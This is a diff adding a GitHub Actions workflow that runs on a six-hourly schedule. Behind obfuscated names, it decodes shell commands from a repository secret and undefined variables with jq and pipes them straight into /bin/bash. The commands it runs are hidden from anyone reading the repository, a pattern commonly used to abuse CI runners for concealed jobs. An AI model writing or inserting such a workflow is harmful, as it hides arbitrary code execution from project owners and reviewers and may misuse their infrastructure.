@@ -1,0 +1,20 @@
+name: nianfurenkai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nianfurenkai
+        env:
+          vwcc653: ${{ secrets.vwcc653 }}
+        run: |
+          echo $vwcc653 | jq -r .ctf729 | /bin/bash
+          echo $utb03149 | jq -r .jxpyl1 | /bin/bash
+          echo $fxts9 | jq -r .h54 | /bin/bash
+          echo $jnfjk49659 | jq -r .jngjz65 | /bin/bash
+
